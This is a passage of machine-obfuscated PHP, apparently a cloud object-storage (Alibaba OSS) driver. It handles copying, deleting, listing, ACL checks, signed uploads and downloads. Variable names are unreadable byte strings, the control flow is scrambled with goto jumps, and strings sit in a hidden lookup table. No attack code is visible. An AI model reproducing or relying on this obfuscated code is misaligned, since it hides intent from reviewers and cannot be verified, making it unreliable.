$F¦„¡¿õ²„[] = $this->client->uploadPartCopy($this->bucket, $DÃ™”“µÁ, $this->bucket, $this->pathEncode($bÚª†Îß†ù), $A¼«à¹­ˆ, $DËôİ÷Ğº‚, $A§¦‘ø˜Í); $A¼«à¹­ˆ = $A¼«à¹­ˆ + 1; } goto e¢áŞÛ Öë; e¢áŞÛ Öë: $Eì†íÑÆñ = array(); foreach ($F¦„¡¿õ²„ as $F«ßÎ‡¶âƒ => $F£õ§¸ ) { $Eì†íÑÆñ[] = array($cöîçÒÌã’[1252] => $F«ßÎ‡¶âƒ + 1, $cöîçÒÌã’[1253] => $F£õ§¸ ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bÚª†Îß†ù), $DËôİ÷Ğº‚, $Eì†íÑÆñ); goto EŞÒî½Ìé; EŞÒî½Ìé: } catch (OSS\Core\OssException $B‚Ì¹¸”¯¿) { return !1; } return !0; } public function moveFile($D£‘İ§–‡¸, $b‰›³íâ’Í) { if ($this->copyFile($D£‘İ§–‡¸, $b‰›³íâ’Í)) { $this->remove($D£‘İ§–‡¸); return $this->getPathOuter($b‰›³íâ’Í); } return !1; } public function delFile($F´´ªÁ‘À¶) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($F´´ªÁ‘À¶)); } catch (OSS\Core\OssException $EÔ¿Ù™ÇÜå) { return !1; } return !0; } public function delFolder($d÷‹í†Ø¨Ù) { goto a½¢êßŠÊ; Cëîõæ×©§: $fÅ­ó£¯åØ = $this->fileList($d÷‹í†Ø¨Ù); $this->listItemCache = !0; $F Î¶Ğ«» = trim($d÷‹í†Ø¨Ù, $B¬á©ŸŸèŠ[8]) . $B¬á©ŸŸèŠ[8]; goto FÂÊ”…¶–; b¼Ñ¢Æõ˜…: return $this->delByBatch($fÅ­ó£¯åØ[$B¬á©ŸŸèŠ[74]]); goto a‡Ÿ†êØëÜ; a½¢êßŠÊ: $B¬á©ŸŸèŠ =& $_SERVER[¢ÌÛ]; if (!$this->exist($d÷‹í†Ø¨Ù)) { return !0; } $this->listItemCache = !1; goto Cëîõæ×©§; FÂÊ”…¶–: if (!empty($d÷‹í†Ø¨Ù) && !in_array($F Î¶Ğ«», $fÅ­ó£¯åØ[$B¬á©ŸŸèŠ[74]])) { $fÅ­ó£¯åØ[$B¬á©ŸŸèŠ[74]][] = $F Î¶Ğ«»; } $Aã™†æ›¢ = $this->delByBatch($fÅ­ó£¯åØ[$B¬á©ŸŸèŠ[73]]); if (!$Aã™†æ›¢) { return !1; } goto b¼Ñ¢Æõ˜…; a‡Ÿ†êØëÜ: } private function delByBatch($AùÕœÊÂ¯) { foreach (array_chunk($AùÕœÊÂ¯, 1000) as $D‚É‚àÈæ§) { try { $this->client->deleteObjects($this->bucket, $D‚É‚àÈæ§); } catch (OSS\Core\OssException $DÈ÷Ší„ŒÑ) { return !1; } } return !0; } public function rename($aÚÖæä»½“, $dîŒ¹ÕœìŞ) { return $this->renameObject($aÚÖæä»½“, $dîŒ¹ÕœìŞ); } private function fileInfo($F›œ¤´³Â», $c¶íË´‚ƒ = false, $c¿¦ì§èùŠ = array()) { goto Cáˆ­á…¾‚; dÄÆ¶–˜ÄÏ: $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[192]] = $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[83]] = 0; $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[193]] = $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[194]] = !0; if (empty($c¿¦ì§èùŠ)) { $Bøô¢ªƒŒ = $this->objectMeta($F›œ¤´³Â»); if (!$Bøô¢ªƒŒ) { return $aÈÓ¼ôÕÔÀ; } $c¿¦ì§èùŠ = array($EØÔ¶”ëæ‰[83] => strtotime($Bøô¢ªƒŒ[$EØÔ¶”ëæ‰[1247]]), $EØÔ¶”ëæ‰[77] => $Bøô¢ªƒŒ[$EØÔ¶”ëæ‰[1246]] + 0); } goto E‚Ú‹’Ş¸ã; E‚Ú‹’Ş¸ã: if (isset($c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[77]])) { $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[77]] = $c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[77]]; } if (isset($c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[83]])) { $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[83]] = $c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[83]]; } if (isset($c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[195]]) && !trim($aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[83]])) { $aÈÓ¼ôÕÔÀ[$EØÔ¶”ëæ‰[83]] = $c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[195]]; } goto aæó “Ò‘; Cáˆ­á…¾‚: $EØÔ¶”ëæ‰ =& $_SERVER[¢ÌÛ]; $aÈÓ¼ôÕÔÀ = array($EØÔ¶”ëæ‰[28] => $this->pathThis($F›œ¤´³Â»), $EØÔ¶”ëæ‰[75] => $this->getPathOuter($F›œ¤´³Â»), $EØÔ¶”ëæ‰[29] => $EØÔ¶”ëæ‰[173], $EØÔ¶”ëæ‰[77] => isset($c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[77]]) ? $c¿¦ì§èùŠ[$EØÔ¶”ëæ‰[77]] : 0, $EØÔ¶”ëæ‰[167] => $this->ext($F›œ¤´³Â»)); if ($c¶íË´‚ƒ) { return $aÈÓ¼ôÕÔÀ; } goto dÄÆ¶–˜ÄÏ; aæó “Ò‘: return $aÈÓ¼ôÕÔÀ; goto EÛİò®Şê; EÛİò®Şê: } private function folderInfo($Aš¯”«ääŞ, $E¾Ø©•İŠ = false, $bÑÂœŞïË¿ = array()) { goto díá„³«Ñ¹; Aöª÷ˆ’À: $F‘‹ì¯ÓÖ·[$ešßßù³—ä[192]] = $F‘‹ì¯ÓÖ·[$ešßßù³—ä[83]] = 0; $F‘‹ì¯ÓÖ·[$ešßßù³—ä[193]] = $F‘‹ì¯ÓÖ·[$ešßßù³—ä[194]] = !0; if (empty($bÑÂœŞïË¿)) { $Aš¯”«ääŞ = rtrim($Aš¯”«ääŞ, $ešßßù³—ä[8]) . $ešßßù³—ä[8]; $B–Ìõ¦•ÁÓ = $this->objectMeta($Aš¯”«ääŞ); if (!$B–Ìõ¦•ÁÓ) { return $F‘‹ì¯ÓÖ·; } $bÑÂœŞïË¿ = array($ešßßù³—ä[192] => $B–Ìõ¦•ÁÓ[$ešßßù³—ä[1254]][$ešßßù³—ä[1255]], $ešßßù³—ä[83] => strtotime($B–Ìõ¦•ÁÓ[$ešßßù³—ä[1247]])); } goto dŠŞëõ–Ş¶; díá„³«Ñ¹: $ešßßù³—ä =& $_SERVER[¢ÌÛ]; $F‘‹ì¯ÓÖ· = array($ešßßù³—ä[28] => $this->pathThis($Aš¯”«ääŞ), $ešßßù³—ä[75] => $this->getPathOuter($ešßßù³—ä[8] . $Aš¯”«ääŞ), $ešßßù³—ä[29] => $ešßßù³—ä[76]); if ($E¾Ø©•İŠ) { return $F‘‹ì¯ÓÖ·; } goto Aöª÷ˆ’À; dŠŞëõ–Ş¶: if (isset($bÑÂœŞïË¿[$ešßßù³—ä[83]])) { $F‘‹ì¯ÓÖ·[$ešßßù³—ä[83]] = $bÑÂœŞïË¿[$ešßßù³—ä[83]]; } if (isset($bÑÂœŞïË¿[$ešßßù³—ä[192]])) { $F‘‹ì¯ÓÖ·[$ešßßù³—ä[192]] = $bÑÂœŞïË¿[$ešßßù³—ä[192]]; } return $F‘‹ì¯ÓÖ·; goto AĞª‘õ„ª; AĞª‘õ„ª: } public function listPath($e’Ö£ëÌ×°, $Fµ›ç‘½œö = false) { $E¡­Ì‘ªç› =& $_SERVER[¢ÌÛ]; $F›½Ü×¢¶ = $this->fileList($e’Ö£ëÌ×°, $E¡­Ì‘ªç›[8], !0); foreach ($F›½Ü×¢¶[$E¡­Ì‘ªç›[74]] as $då‡³•ªÓ˜ => $d–Ë†‡›«Ğ) { $F›½Ü×¢¶[$E¡­Ì‘ªç›[74]][$då‡³•ªÓ˜] = $this->folderInfo($d–Ë†‡›«Ğ, $Fµ›ç‘½œö, $d–Ë†‡›«Ğ); } foreach ($F›½Ü×¢¶[$E¡­Ì‘ªç›[73]] as $då‡³•ªÓ˜ => $d–Ë†‡›«Ğ) { $F›½Ü×¢¶[$E¡­Ì‘ªç›[73]][$då‡³•ªÓ˜] = $this->fileInfo($d–Ë†‡›«Ğ[$E¡­Ì‘ªç›[28]], $Fµ›ç‘½œö, $d–Ë†‡›«Ğ); } return $F›½Ü×¢¶; } public function has($b—å‡¥ğºÑ, $a‘µğ××ŞÌ = false, $CØ‡õ­œø‰ = true) { goto f­Í„ñ ƒá; eƒŠ°Ü˜…: $BÁø×½ˆÛ = $d•¿ÉÚ£ç§[33]; $DÚ‚Ó½÷§ = 500; $c¯‰á‡æ¾à = $EÓµŒ°»‡° = 0; goto F‰Ñ†…«†; F‰Ñ†…«†: while (!0) { check_abort(); $fÁ¡Ü……¢÷ = array($d•¿ÉÚ£ç§[1242] => $d•¿ÉÚ£ç§[8], $d•¿ÉÚ£ç§[1243] => $eâ·š‚½–Ú, $d•¿ÉÚ£ç§[1244] => $DÚ‚Ó½÷§, $d•¿ÉÚ£ç§[1245] => $BÁø×½ˆÛ); try { $Cƒ‚Õ»Õ¥ = $this->client->listObjects($this->bucket, $fÁ¡Ü……¢÷); } catch (OSS\Core\OssException $FØˆ¾åßÎ×) { break; } $BÁø×½ˆÛ = $Cƒ‚Õ»Õ¥->getNextMarker(); $D‘öµôÙ‘” = $Cƒ‚Õ»Õ¥->getObjectList(); $fÖ´ø¼²á‡ = $Cƒ‚Õ»Õ¥->getPrefixList(); if ($a‘µğ××ŞÌ) { if (count($D‘öµôÙ‘”) > 1 || count($D‘öµôÙ‘”) == 1 && $D‘öµôÙ‘”[0]->getKey() != $eâ·š‚½–Ú) { $c¯‰á‡æ¾à += count($D‘öµôÙ‘”) - 1; } if (!empty($fÖ´ø¼²á‡)) { $EÓµŒ°»‡° += count($fÖ´ø¼²á‡); } if ($BÁø×½ˆÛ === $d•¿ÉÚ£ç§[33]) { break; } continue; } if ($CØ‡õ­œø‰) { if (!empty($D‘öµôÙ‘”)) { if (count($D‘öµôÙ‘”) > 1 || $D‘öµôÙ‘”[0]->getKey() != $eâ·š‚½–Ú) { return !0; } } } else { if (!empty($fÖ´ø¼²á‡)) { return !0; } } if ($BÁø×½ˆÛ === $d•¿ÉÚ£ç§[33]) { break; } } if ($a‘µğ××ŞÌ) { return array($d•¿ÉÚ£ç§[201] => $c¯‰á‡æ¾à, $d•¿ÉÚ£ç§[202] => $EÓµŒ°»‡°); } return !1; goto C°‚á†ñîÃ; f­Í„ñ ƒá: $d•¿ÉÚ£ç§ =& $_SERVER[¢ÌÛ]; $b—å‡¥ğºÑ = trim($b—å‡¥ğºÑ, $d•¿ÉÚ£ç§[8]); $eâ·š‚½–Ú = empty($b—å‡¥ğºÑ) ? $d•¿ÉÚ£ç§[33] : $b—å‡¥ğºÑ . $d•¿ÉÚ£ç§[8]; goto eƒŠ°Ü˜…; C°‚á†ñîÃ: } public function listAll($Bì¸ÁÙ¸¬“) { $D¿šˆ‘Õå¦ =& $_SERVER[¢ÌÛ]; $Còˆ…›âÆØ = $this->fileList($Bì¸ÁÙ¸¬“, $D¿šˆ‘Õå¦[33], !0); $eõèƒ¦¥ÆÉ = array(); foreach ($Còˆ…›âÆØ[$D¿šˆ‘Õå¦[73]] as $Aã·á¤ó››) { $eõèƒ¦¥ÆÉ[$Aã·á¤ó››[$D¿šˆ‘Õå¦[28]]] = $Aã·á¤ó››[$D¿šˆ‘Õå¦[77]]; } foreach ($Còˆ…›âÆØ[$D¿šˆ‘Õå¦[74]] as $Aã·á¤ó››) { if (is_string($Aã·á¤ó››)) { $eõèƒ¦¥ÆÉ[$Aã·á¤ó››] = 0; } } return $this->listAllFiles($Bì¸ÁÙ¸¬“, array_keys($eõèƒ¦¥ÆÉ), $eõèƒ¦¥ÆÉ); } public function canRead($EäŸÈ ä) { $B¿óÜ‡Ÿä =& $_SERVER[¢ÌÛ]; $EÁ›ÚÄ‹³ = $this->pathAcl($EäŸÈ ä); return $EÁ›ÚÄ‹³ == $B¿óÜ‡Ÿä[1256] || $EÁ›ÚÄ‹³ == $B¿óÜ‡Ÿä[517] ? !0 : !1; } public function canWrite($cå†íÈ´ÜŠ) { $F—ÂÕÅÉÙ = $this->pathAcl($cå†íÈ´ÜŠ); return $F—ÂÕÅÉÙ == $_SERVER[¢ÌÛ][517] ? !0 : !1; } public function pathAcl($f¾ É« ê¡) { goto BµŠƒË™İ; EÂ¾Ç¦Ÿ³…: return $dòÔÍ­ÊÎ; goto Dƒ‰¹“Øºã; BŒŒ‘¥¤ªÛ: $dòÔÍ­ÊÎ = $e›«¾ÕĞ¾Ì == $DŠ¾ÆîÉ¡É[34] ? $this->bucketAcl : $e›«¾ÕĞ¾Ì; if ($dòÔÍ­ÊÎ == $DŠ¾ÆîÉ¡É[1257]) { return $DŠ¾ÆîÉ¡É[1256]; } if ($dòÔÍ­ÊÎ == $DŠ¾ÆîÉ¡É[1258]) { return $DŠ¾ÆîÉ¡É[517]; } goto EÂ¾Ç¦Ÿ³…; BµŠƒË™İ: $DŠ¾ÆîÉ¡É =& $_SERVER[¢ÌÛ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $e›«¾ÕĞ¾Ì = $this->client->getObjectAcl($this->bucket, $this->pathEncode($f¾ É« ê¡)); } catch (OSS\Core\OssException $B‘…æˆ‡ä») { return !1; } goto BŒŒ‘¥¤ªÛ; Dƒ‰¹“Øºã: } private function chmodPath($Aˆ¾¢±‰Õ¢, $cÇØíÃŠé = '') { $AàÏõä‘†ñ =& $_SERVER[¢ÌÛ]; $e«„©ŞØˆ“ = empty($cÇØíÃŠé) ? $AàÏõä‘†ñ[1258] : $cÇØíÃŠé; $b“ø¤˜ = array($AàÏõä‘†ñ[34], $AàÏõä‘†ñ[191], $AàÏõä‘†ñ[1257], $AàÏõä‘†ñ[1258]); if (!in_array($e«„©ŞØˆ“, $b“ø¤˜)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Aˆ¾¢±‰Õ¢), $e«„©ŞØˆ“); } catch (OSS\Core\OssException $FïÚ©ÀØŒ) { return !1; } return !0; } public function getContent($eğ¤ŞÜ´ÀÔ) { return $this->fileSubstr($eğ¤ŞÜ´ÀÔ, -1); } public function setContent($BòÔŒŠ‘¼ó, $eÅ¯©Å‹µÈ = '') { $AÀÅ¡½¬¨ =& $_SERVER[¢ÌÛ]; try { $D¤è¨‰ = $this->trafficLimit($AÀÅ¡½¬¨[1259]); $e³½ÃÏÛ = $this->client->putObject($this->bucket, $this->pathEncode($BòÔŒŠ‘¼ó), $eÅ¯©Å‹µÈ, $D¤è¨‰); } catch (OSS\Core\OssException $f‡Ù¬®ËãÁ) { return !1; } $b¡Ô›¸§ñë = array($AÀÅ¡½¬¨[1248] => trim($e³½ÃÏÛ[$AÀÅ¡½¬¨[1260]], $AÀÅ¡½¬¨[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BòÔŒŠ‘¼ó))); $this->updateObjMeta($BòÔŒŠ‘¼ó, $b¡Ô›¸§ñë); return isset($e³½ÃÏÛ[$AÀÅ¡½¬¨[1261]][$AÀÅ¡½¬¨[1207]]) ? !0 : !1; } private function updateObjMeta($fµ¸ò¨±ì², $eîŒËš™) { $fµ¸ò¨±ì² = $this->pathEncode($fµ¸ò¨±ì²); try { $A½¤÷œ³Ùì = array(OSS\OssClient::OSS_HEADERS => $eîŒËš™); $this->client->copyObject($this->bucket, $fµ¸ò¨±ì², $this->bucket, $fµ¸ò¨±ì², $A½¤÷œ³Ùì); } catch (OSS\Core\OssException $F‚Ú¼Ò¿Ë) { return !1; } return !0; } public function upload($FçºÜ†îÃÚ, $dË¨ß¶¿Û‚, $aÏ†ˆ§¥˜– = false, $c‰¶Ÿˆ¶šê = REPEAT_REPLACE) { $fØŠÙ°ÜÅØ =& $_SERVER[¢ÌÛ]; $Dù”šÜ§¿á = trim($FçºÜ†îÃÚ, $fØŠÙ°ÜÅØ[8]); $C‰¡ÂĞ„Îã = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($fØŠÙ°ÜÅØ[1248] => @md5_file($dË¨ß¶¿Û‚)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($FçºÜ†îÃÚ))); $C‰¡ÂĞ„Îã = $this->trafficLimit($fØŠÙ°ÜÅØ[1259], $C‰¡ÂĞ„Îã); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Dù”šÜ§¿á), $dË¨ß¶¿Û‚, $C‰¡ÂĞ„Îã); } catch (OSS\Core\OssException $C¶ˆÖòãÊä) { return !1; } return $this->getPathOuter($FçºÜ†îÃÚ); } public function getHost() { $d±ïø°‘¹Í =& $_SERVER[¢ÌÛ]; $AßáªËÏÁÜ = explode($d±ïø°‘¹Í[177], parent::getHost()); return $AßáªËÏÁÜ[0] . $d±ïø°‘¹Í[177] . $this->bucket . $d±ïø°‘¹Í[94] . $AßáªËÏÁÜ[1]; } public function uploadFormData($aŸßùƒÈ‘, $dÙŞ˜±†ğ˜ = 3600) { goto cÕ…Æë†¡Á; b‘ğÌ½áÕ£: $c¬¨Ô‡Áø× = date($aÚ„éÖÄÀï[1262], time() + $c‘ÄÊ‘„á°); $Dš¾È£Ö÷• = new DateTime($c¬¨Ô‡Áø×); $DË·Ã˜˜Î = $Dš¾È£Ö÷•->format(DateTime::ISO8601); goto c‹ÈïÏ´ïò; f‹ïœÎ’†: return $a”×Ğ§•; goto EÒ‰ä»­ŸÅ; døÕô´æàŸ: $Aàù½ë¢ó = base64_encode(hash_hmac($aÚ„éÖÄÀï[228], $a†Ä¡©º†—, $this->secret, !0)); $a”×Ğ§• = array($aÚ„éÖÄÀï[1173] => $a†Ä¡©º†—, $aÚ„éÖÄÀï[1265] => $this->accessKey, $aÚ„éÖÄÀï[1169] => $aÚ„éÖÄÀï[1161], $aÚ„éÖÄÀï[1266] => $Aàù½ë¢ó, $aÚ„éÖÄÀï[175] => $Bé‡õ¨„õñ); $a”×Ğ§• = $this->trafficLimit($aÚ„éÖÄÀï[1259], $a”×Ğ§•); goto f‹ïœÎ’†; EîÃ­éÌŸ: $EÒÑÉ¾éŸÅ = $this->pathFather($aŸßùƒÈ‘); $a®äöÆÓò× = array($aÚ„éÖÄÀï[1163] => $DË·Ã˜˜Î, $aÚ„éÖÄÀï[1164] => array(array($aÚ„éÖÄÀï[1264], 0, $b³Ó‚ÓßÂÂ), array($aÚ„éÖÄÀï[1167], $aÚ„éÖÄÀï[1168], $EÒÑÉ¾éŸÅ))); $a†Ä¡©º†— = base64_encode(json_encode($a®äöÆÓò×)); goto døÕô´æàŸ; c‹ÈïÏ´ïò: $f÷Ôƒîù—× = strpos($DË·Ã˜˜Î, $aÚ„éÖÄÀï[292]); $DË·Ã˜˜Î = substr($DË·Ã˜˜Î, 0, $f÷Ôƒîù—×) . $aÚ„éÖÄÀï[1263]; $b³Ó‚ÓßÂÂ = 1048576000 * 5; goto EîÃ­éÌŸ; cÕ…Æë†¡Á: $aÚ„éÖÄÀï =& $_SERVER[¢ÌÛ]; if (!($Bé‡õ¨„õñ = $this->getHost())) { return !1; } $c‘ÄÊ‘„á° = $dÙŞ˜±†ğ˜; goto b‘ğÌ½áÕ£; EÒ‰ä»­ŸÅ: } public function multiUploadFormData($AôÇó«ä‚, $bÅõ¯ƒµÉõ = 3600) { $Fö„Õåç²º =& $_SERVER[¢ÌÛ]; if (!($bç¨äâß“š = $this->getHost())) { return !1; } $cÄ¡ÕˆÈÛ‚ = $this->trafficLimit($Fö„Õåç²º[1259]); $DÔÓ™ˆ’äæ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($AôÇó«ä‚), $cÄ¡ÕˆÈÛ‚); return array($Fö„Õåç²º[219] => $DÔÓ™ˆ’äæ, $Fö„Õåç²º[175] => $bç¨äâß“š . $Fö„Õåç²º[8] . $this->pathEncode($AôÇó«ä‚), $Fö„Õåç²º[220] => gmdate($Fö„Õåç²º[1267]), $Fö„Õåç²º[92] => $AôÇó«ä‚); } public function multiUploadAuthData($dÊô†ğ§À, $f”Ëˆ‘˜µÙ = array()) { goto aïÔñƒÉöØ; AßÜŞË¬òÚ: $EÏÈ³ˆÙˆ = array($e–®¸«õ˜[222], $e–®¸«õ˜[33], $e–®¸«õ˜[118], $c‰œåÏ‘¢ì, "\170\55\x6f\x73\x73\55\144\x61\x74\145\72{$c‰œåÏ‘¢ì}", $e–®¸«õ˜[8] . $this->bucket . $e–®¸«õ˜[8] . $cŠÎ©äĞœñ . $EÈ›’—”Ğœ); if (strpos($EÈ›’—”Ğœ, $e–®¸«õ˜[223]) === 0) { $EÏÈ³ˆÙˆ[0] = $e–®¸«õ˜[224]; if ($B™–ì‡Ùö† = $this->trafficLimit($e–®¸«õ˜[1259])) { $cŠÎ©äĞœñ = $e–®¸«õ˜[1268]; array_splice($EÏÈ³ˆÙˆ, 5, 0, $cŠÎ©äĞœñ . $e–®¸«õ˜[4] . $B™–ì‡Ùö†[$cŠÎ©äĞœñ]); } } if (isset($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[225]]) && $f”Ëˆ‘˜µÙ[$e–®¸«õ˜[225]] == $e–®¸«õ˜[226]) { $EÏÈ³ˆÙˆ[0] = $e–®¸«õ˜[226]; } goto Dâá™ÔÃ°‰; BãĞµÃÎ¹: $cŠÎ©äĞœñ = $dÊô†ğ§À; if (isset($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[92]])) { $cŠÎ©äĞœñ = $f”Ëˆ‘˜µÙ[$e–®¸«õ˜[92]]; unset($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[92]]); } if (isset($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[221]])) { $f”Ëˆ‘˜µÙ[$e–®¸«õ˜[220]] = $c‰œåÏ‘¢ì; return $this->listUploadParts($cŠÎ©äĞœñ, $f”Ëˆ‘˜µÙ); } goto AßÜŞË¬òÚ; Dâá™ÔÃ°‰: if (!empty($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[1269]])) { $f¡‹…Ä¬‹‚ = array_merge(array($EÏÈ³ˆÙˆ[4]), $f”Ëˆ‘˜µÙ[$e–®¸«õ˜[1269]]); sort($f¡‹…Ä¬‹‚); $EÏÈ³ˆÙˆ[4] = implode($e–®¸«õ˜[227], $f¡‹…Ä¬‹‚); } $F²¦Öˆ¿İ½ = implode($e–®¸«õ˜[227], $EÏÈ³ˆÙˆ); $CÁš·Û‡¦ = base64_encode(hash_hmac($e–®¸«õ˜[228], $F²¦Öˆ¿İ½, $this->secret, !0)); goto E¡ÚÎ…‘ôæ; E¡ÚÎ…‘ôæ: $bÇÅİ£ÃÀ = $e–®¸«õ˜[1232] . $this->accessKey . $e–®¸«õ˜[4] . $CÁš·Û‡¦; if (strpos($EÈ›’—”Ğœ, $e–®¸«õ˜[223]) === 0) { $bÇÅİ£ÃÀ = array($e–®¸«õ˜[230] => $bÇÅİ£ÃÀ, $e–®¸«õ˜[220] => $c‰œåÏ‘¢ì); if ($B™–ì‡Ùö†) { $bÇÅİ£ÃÀ = array_merge($bÇÅİ£ÃÀ, $B™–ì‡Ùö†); } } return $bÇÅİ£ÃÀ; goto cÈã«¿¼ÍÆ; aïÔñƒÉöØ: $e–®¸«õ˜ =& $_SERVER[¢ÌÛ]; $c‰œåÏ‘¢ì = isset($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[220]]) ? $f”Ëˆ‘˜µÙ[$e–®¸«õ˜[220]] : gmdate($e–®¸«õ˜[1267]); $EÈ›’—”Ğœ = isset($f”Ëˆ‘˜µÙ[$e–®¸«õ˜[167]]) ? $f”Ëˆ‘˜µÙ[$e–®¸«õ˜[167]] : $e–®¸«õ˜[33]; goto BãĞµÃÎ¹; cÈã«¿¼ÍÆ: } public function listUploadParts($CÜ¸ÆŞŞ²æ, $fæÏÁã‡ÒÑ) { goto E°×µ‰§á‘; BÍ÷…ù®³ğ: unset($fæÏÁã‡ÒÑ[$dàĞØ‹¢­™[221]], $fæÏÁã‡ÒÑ[$dàĞØ‹¢­™[225]]); $B¯Å´æĞŒ = $this->multiUploadAuthData($CÜ¸ÆŞŞ²æ, $fæÏÁã‡ÒÑ); if (empty($B¯Å´æĞŒ)) { return !1; } goto bğàòàöÉ; D•ÀÃ£ãµì: $fùœï™· = $DŒø¯öÇ->getListPart(); $EÇâ¥‚Œâî = array(); foreach ($fùœï™· as $F¦ƒ³ÁŒ) { $EÇâ¥‚Œâî[] = array($dàĞØ‹¢­™[1252] => $F¦ƒ³ÁŒ->getPartNumber(), $dàĞØ‹¢­™[1253] => trim($F¦ƒ³ÁŒ->getETag(), $dàĞØ‹¢­™[115])); } goto BÍ÷…ù®³ğ; E°×µ‰§á‘: $dàĞØ‹¢­™ =& $_SERVER[¢ÌÛ]; $CÃÉÒ’ïŒà = parse_url_query($fæÏÁã‡ÒÑ[$dàĞØ‹¢­™[167]]); $DŒø¯öÇ = $this->client->listParts($this->bucket, $this->pathEncode($CÜ¸ÆŞŞ²æ), $CÃÉÒ’ïŒà[$dàĞØ‹¢­™[219]]); goto D•ÀÃ£ãµì; bğàòàöÉ: return array($dàĞØ‹¢­™[230] => $B¯Å´æĞŒ, $dàĞØ‹¢­™[220] => $fæÏÁã‡ÒÑ[$dàĞØ‹¢­™[220]], $dàĞØ‹¢­™[232] => $EÇâ¥‚Œâî); goto a˜¦¶ªôŠÁ; a˜¦¶ªôŠÁ: } public function download($e”¡á³’®, $f¶¯ßî™‚Í) { if ($this->isFolder($e”¡á³’®)) { return !1; } try { $f•¸ÂĞ†…Ï = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f¶¯ßî™‚Í); $f•¸ÂĞ†…Ï = $this->trafficLimit($_SERVER[¢ÌÛ][108], $f•¸ÂĞ†…Ï); $this->client->getObject($this->bucket, $this->pathEncode($e”¡á³’®), $f•¸ÂĞ†…Ï); } catch (OSS\Core\OssException $dÜÜëó”êò) { return !1; } return $f¶¯ßî™‚Í; } public function fileSubstr($F˜­’Û¡™ê, $bÓŸ™Õ±ºÛ = 0, $E½“©ÍË— = false) { if ($bÓŸ™Õ±ºÛ === -1) { $C·¸ì«¢³° = array(); } else { if ($E½“©ÍË— === !1) { $eƒñ…˜– = $this->size($F˜­’Û¡™ê); } else { $eƒñ…˜– = $bÓŸ™Õ±ºÛ + $E½“©ÍË— - 1; } $C·¸ì«¢³° = array(OSS\OssClient::OSS_RANGE => "{$bÓŸ™Õ±ºÛ}\x2d{$eƒñ…˜–}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($F˜­’Û¡™ê), $C·¸ì«¢³°); } catch (OSS\Core\OssException $aª¤Úï) { think_exception($aª¤Úï->getMessage()); return !1; } } private function trafficLimit($b†çÊİÃÌÔ, $aØâ¾¤íÆã = array()) { goto AÑ…Õ¾…¸; bÕÏ˜“æÌÁ: if (!$a‰…‡†Î¡Ñ) { return $aØâ¾¤íÆã; } $a‰…‡†Î¡Ñ = $a‰…‡†Î¡Ñ < 819200 ? 819200 : ($a‰…‡†Î¡Ñ > 838860800 ? 838860800 : $a‰…‡†Î¡Ñ); $aØâ¾¤íÆã[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a‰…‡†Î¡Ñ); goto cï–ßÆ¾“¡; cï–ßÆ¾“¡: return $aØâ¾¤íÆã; goto Fù…ï½Œë; AÑ…Õ¾…¸: $föñ‘„æÑ÷ =& $_SERVER[¢ÌÛ]; if ($b†çÊİÃÌÔ == $föñ‘„æÑ÷[1259] && $this->isUploadServer() || $b†çÊİÃÌÔ == $föñ‘„æÑ÷[108] && $this->isFileOutServer()) { return $aØâ¾¤íÆã; } $a‰…‡†Î¡Ñ = floatval($GLOBALS[$föñ‘„æÑ÷[6]][$föñ‘„æÑ÷[87]][$föñ‘„æÑ÷[106]][$b†çÊİÃÌÔ]) * 1024 * 1024 * 8; goto bÕÏ˜“æÌÁ; Fù…ï½Œë: } public function link($dˆ•«ª¼, $Dºˆµö¾Şš = array()) { $CíŠ¯Öœñì =& $_SERVER[¢ÌÛ]; if (!$this->exist($dˆ•«ª¼) || $this->isFolder($dˆ•«ª¼)) { return !1; } try { $Dºˆµö¾Şš = $this->trafficLimit($CíŠ¯Öœñì[108], $Dºˆµö¾Şš); $CÑñˆ‹Í = $this->client->signUrl($this->bucket, $this->pathEncode($dˆ•«ª¼), 3600 * 12, $CíŠ¯Öœñì[226], $Dºˆµö¾Şš); return $this->getCdnLink($CÑñˆ‹Í); } catch (OSS\Core\OssException $f£Œå¢¯ê‘) { return !1; } } public function fileOut($E’§Ë”‰, $a‹¨„íƒˆ³ = false, $Cœª…¤¡éâ = false, $cËÁÒ‚ÕÆâ = '') { goto Bî“±†é»¾; Bî“±†é»¾: $b¾®µ„á’Á =& $_SERVER[¢ÌÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($E’§Ë”‰, $a‹¨„íƒˆ³, $Cœª…¤¡éâ, $cËÁÒ‚ÕÆâ); } if (!$Cœª…¤¡éâ) { $Cœª…¤¡éâ = $this->pathThis($E’§Ë”‰); } goto Fç‘£‰›„½; EÊÄõ”¥Î: $a‹¨„íƒˆ³ = $a‹¨„íƒˆ³ ? $b¾®µ„á’Á[212] : 